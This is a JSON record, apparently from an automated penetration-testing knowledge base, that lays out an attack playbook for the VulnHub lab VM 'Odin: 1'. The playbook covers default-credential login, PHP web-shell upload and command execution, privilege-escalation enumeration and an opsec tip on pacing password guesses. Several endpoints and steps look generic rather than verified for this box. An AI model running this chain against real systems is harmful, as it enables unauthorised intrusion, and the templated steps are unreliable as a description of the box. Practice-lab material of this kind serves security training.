{
  "vuln_id": "vulnhub_odin",
  "description": "Odin: 1 is a vulnerable virtual machine designed for penetration testing practice, containing multiple vulnerabilities including weak credentials, file upload, and privilege escalation.",
  "category": "weak_credential",
  "cves": [],
  "match_keywords": [
    "Odin: 1",
    "vulnhub",
    "Bjorn",
    "2020-11-21"
  ],
  "fingerprint_keywords": [
    "Odin: 1",
    "VulnHub",
    "Bjorn"
  ],
  "affected_versions": "Odin: 1 virtual machine",
  "default_port": 80,
  "common_endpoints": [
    "/",
    "/admin",
    "/upload",
    "/shell.php"
  ],
  "detection_method": "Send a GET request to the target to identify the web server and potential default credentials. For example: curl -s http://{TARGET}/ | grep -i 'odin' or use nmap to scan open ports and services.",
  "exploit_steps": [
    {
      "step": 1,
      "description": "Enumerate the target to identify open ports and services using nmap.",
      "command": "nmap -sV -sC {TARGET}",
      "expected_result": "Open ports such as 80 (HTTP) and 22 (SSH) are identified, along with service versions.",
      "notes": "Adjust scan options based on network conditions and target response."
    },
    {
      "step": 2,
      "description": "Access the web application on port 80 to look for default credentials or weak authentication.",
      "command": "curl -v http://{TARGET}/",
      "expected_result": "HTTP 200 response with web page content, potentially revealing login forms or default credentials.",
      "notes": "Check page source and common directories like /admin for login interfaces."
    },
    {
      "step": 3,
      "description": "Attempt to login with default or weak credentials (e.g., admin:admin) if a login form is found.",
      "command": "curl -X POST http://{TARGET}/login -d 'username=admin&password=admin' -v",
      "expected_result": "Successful login (HTTP 200 or redirect) or failure message.",
      "notes": "Use tools like hydra or burp suite for brute-force if credentials are not default."
    },
    {
      "step": 4,
      "description": "If authenticated, look for file upload functionality to upload a malicious shell (e.g., PHP reverse shell).",
      "command": "curl -X POST http://{TARGET}/upload -F 'file=@shell.php' -H 'Cookie: session=valid_session' -v",
      "expected_result": "File upload success with path to uploaded file (e.g., /uploads/shell.php).",
      "notes": "Ensure the uploaded file has executable permissions and is in a web-accessible directory."
    },
    {
      "step": 5,
      "description": "Access the uploaded shell to gain remote code execution (RCE).",
      "command": "curl http://{TARGET}/uploads/shell.php",
      "expected_result": "Execution of shell commands or reverse shell connection if callback is set up.",
      "notes": "If using a reverse shell, set up a listener on the attacker machine first."
    },
    {
      "step": 6,
      "description": "Privilege escalation to root by exploiting misconfigurations or vulnerabilities within the system.",
      "command": "ssh user@{TARGET} 'sudo -l'",
      "expected_result": "List of sudo permissions, potentially allowing privilege escalation via sudo or SUID binaries.",
      "notes": "Common techniques include exploiting sudo misconfigurations, kernel vulnerabilities, or weak file permissions."
    }
  ],
  "verification_command": "curl http://{TARGET}/uploads/shell.php?cmd=id",
  "verification_success_sign": "Response contains 'uid=' and 'gid=' indicating command execution (e.g., uid=33(www-data) gid=33(www-data) groups=33(www-data)).",
  "requires_callback": true,
  "callback_note": "A reverse shell requires the target to connect back to the attacker's machine. Alternative: Use a web shell for command execution without callback, but this may be less reliable for interactive sessions.",
  "remediation": "1. Use strong, unique passwords and avoid default credentials. 2. Restrict file uploads to safe file types and validate inputs. 3. Implement proper access controls and least privilege principles. 4. Regularly update and patch software. 5. Conduct security audits and penetration testing.",
  "privesc_steps": [
    {
      "step": 1,
      "description": "在 webshell 或反弹 shell 中确认用户、内核与发行版",
      "command": "id; uname -a; cat /etc/os-release"
    },
    {
      "step": 2,
      "description": "检查 sudo 与常见 SUID",
      "command": "sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -40"
    },
    {
      "step": 3,
      "description": "查看计划任务与可写服务单元（若存在 systemd）",
      "command": "ls -la /etc/cron* 2>/dev/null; ls -la /etc/systemd/system 2>/dev/null | head -30"
    },
    {
      "step": 4,
      "description": "若已获得 SSH，用本地脚本做快速枚举（可选）",
      "command": "test -f /tmp/linpeas.sh && bash /tmp/linpeas.sh || echo 'upload enumerators only when authorized'"
    }
  ],
  "path_templates": [
    {
      "stage": "surface_enum",
      "precondition": "HTTP+SSH 开放",
      "action": "默认/弱口令与管理页、上传点枚举",
      "success_sign": "登录成功或发现上传接口",
      "next_stage": "foothold"
    },
    {
      "stage": "foothold",
      "precondition": "可上传或可执行 Web shell",
      "action": "上传 webshell 并验证 id/whoami",
      "success_sign": "命令执行回显",
      "next_stage": "privesc"
    },
    {
      "stage": "privesc",
      "precondition": "低权限 Web 用户",
      "action": "sudo、SUID、内核与定时任务",
      "success_sign": "root 权限",
      "next_stage": "objective"
    }
  ],
  "fallbacks": [
    {
      "stage": "foothold",
      "action": "Web 弱口令失败时尝试 SSH 与相同密码复用"
    }
  ],
  "opsec_notes": [
    "弱口令尝试需控制速率；优先小字典与已知默认组合"
  ],
  "tags": [
    "vulnhub",
    "weak-credentials",
    "file-upload",
    "rce",
    "privilege-escalation",
    "ctf",
    "penetration-testing"
  ],
  "search_text": "Odin: 1 is a vulnerable virtual machine designed for penetration testing practice, containing multiple vulnerabilities including weak credentials, file upload, and privilege escalation. weak_credential Odin: 1 vulnhub Bjorn 2020-11-21 Odin: 1 VulnHub Bjorn Send a GET request to the target to identify the web server and potential default credentials. For example: curl -s http://{TARGET}/ | grep -i 'odin' or use nmap to scan open ports and services. Odin: 1 virtual machine vulnhub weak-credentials file-upload rce privilege-escalation ctf penetration-testing Enumerate the target to identify open ports and services using nmap. Access the web application on port 80 to look for default credentials or weak authentication. Attempt to login with default or weak credentials (e.g., admin:admin) if a login form is found. If authenticated, look for file upload functionality to upload a malicious shell (e.g., PHP reverse shell). Access the uploaded shell to gain remote code execution (RCE). Privilege escalation to root by exploiting misconfigurations or vulnerabilities within the system.",
